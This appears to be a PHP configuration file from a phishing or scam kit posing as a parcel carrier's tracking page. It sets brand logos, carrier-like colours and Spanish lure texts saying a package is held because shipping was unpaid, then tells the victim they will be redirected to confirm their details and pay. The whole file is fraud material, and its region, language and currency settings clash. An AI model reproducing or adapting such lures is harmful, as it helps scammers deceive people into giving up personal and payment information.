<?php

// product
$wallID = "213123asdaw";

// brand
$brandLogo = "/templates/brands/zcjtl3l9qt8.png";
$favicon = "/templates/brands/9jdolr41085.gif";
$mainColor = "rgb(212,5,17)";
$secondaryColor = "rgb(255,204,0)";
$headerColor = "rgb(255,204,0)";
$white = "true";

// geo
$geo = "uk";
$langTag = "es";
$currency = "$";

// texts
$texts = [
    "us-dhh" => [
        "title" => "Seguimiento y Rastreo",
        "text1" => "ENTREGA PENDIENTE",
        "text2" => "Tiene (1) paquete en espera.",
        "text3" => "Su paquete fue recogido",
        "text4" => "Número de paquete: AIPD-1512-KL10",
        "text5" => "¡Su paquete está listo para la entrega!",
        "text6" => "Paquete en espera",
        "text7" => "Confirme los detalles de entrega en la siguiente página",
        "text8" => "El costo de envío no fue pagado por el proveedor",
        "text9" => "Confirme sus detalles de entrega en la página siguiente",
        "text10" => "Su código de seguimiento",
        "text11" => "Continuar",
        "text12" => "Localizando su paquete...",
        "text13" => "Buscando el número de seguimiento...",
        "text14" => "Buscando las opciones de entrega...",
        "text15" => "Información del paquete:",
        "text16" => "Contenido por guía:",
        "text17" => "Estado:",
        "text18" => "Listo para enviar",
        "text19" => "Vía de envío:",
        "text20" => "Costo de envío:",
        "text21" => "Pendiente",
        "text22" => "Programe su entrega ahora",
        "text23" => "¿Cómo le gustaría recibir su pedido?",
        "text24" => "Entrega a domicilio/trabajo",
        "text25" => "Voy a recogerlo yo mismo",
        "text26" => "¿Dónde desea que se entregue?",
        "text27" => "A domicilio",
        "text28" => "Al trabajo",
        "text29" => "¿Cuándo le gustaría que se realizara la entrega?",
        "text30" => "Día laborable",
        "text31" => "Fin de semana",
        "text32" => "Guardando sus preferencias",
        "text33" => "Confirmando su paquete",
        "text34" => "¡El paquete está reservado!",
        "text35" => "CONFIRMACIÓN DE PEDIDO",
        "text36" => "Entrega estimada:",
        "text37" => "Entre las 8:30 a.m. y las 6:00 p.m.",
        "text38" => "1. Será redirigido a la página del proveedor.",
        "text39" => "2. Confirme sus datos y el costo de envío.",
        "text40" => "3. Una vez completado, la fecha de entrega estimada se mostrará arriba.",
        "text41" => "SIGUIENTE PÁGINA",
        "text42" => "*Se requiere firma al momento de la entrega",
        "text43" => "2024 © - todos los derechos reservados",
        "text44" => "Sitio | Cuentas | Preguntas frecuentes | Conectar",
        "text45" => "El paquete ya está en el depósito."
    ]
];

?>